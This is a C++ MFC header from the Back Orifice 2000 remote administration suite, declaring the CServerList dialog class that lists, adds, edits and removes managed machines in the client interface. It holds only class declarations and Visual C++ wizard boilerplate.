/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#if !defined(AFX_SERVERLIST_H__720D76C8_A7E5_11D2_ADC4_0000F8084273__INCLUDED_)
#define AFX_SERVERLIST_H__720D76C8_A7E5_11D2_ADC4_0000F8084273__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// ServerList.h : header file
//

#include"GradientDialog.h"
class CBOWDoc;

////////////////////////////////////////////////w/////////////////////////////
// CServerList dialog

class CServerList: public CGradientDialog
{
// Construction
public:
	CServerList(CWnd* pParent = NULL);   // standard constructor
	virtual ~CServerList();
	void CleanUpAndClose(void);
	void DeleteItem(int idx);
	void DeleteAllItems(void);
	void SynchToDocument(CBOWDoc *cbd);
	void UpdateListStatus(void);
	void HandleNetworkPolls(void);
	void UseGradient(BOOL bUse);

// Dialog Data
	//{{AFX_DATA(CServerList)
	enum { IDD = IDD_SERVERLIST };
		// NOTE: the ClassWizard will add data members here
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CServerList)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	virtual void OnCancel();
	virtual void OnOK();
	//}}AFX_VIRTUAL

// Implementation
protected:

	CImageList  m_NormalImageList;
	CImageList  m_SmallImageList;
	int m_nUpdateTimer;

public:
	// Generated message map functions
	//{{AFX_MSG(CServerList)
	afx_msg void OnDetails();
	afx_msg void OnNewmachine();
	afx_msg void OnDeletemachine();
	afx_msg void OnEditmachine();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL OnInitDialog();
	afx_msg void OnItemchangedServerlist(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnKeydownServerlist(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnDblclkServerlist(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnAllowDocking();
	afx_msg void OnTimer(UINT nIDEvent);
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_SERVERLIST_H__720D76C8_A7E5_11D2_ADC4_0000F8084273__INCLUDED_)
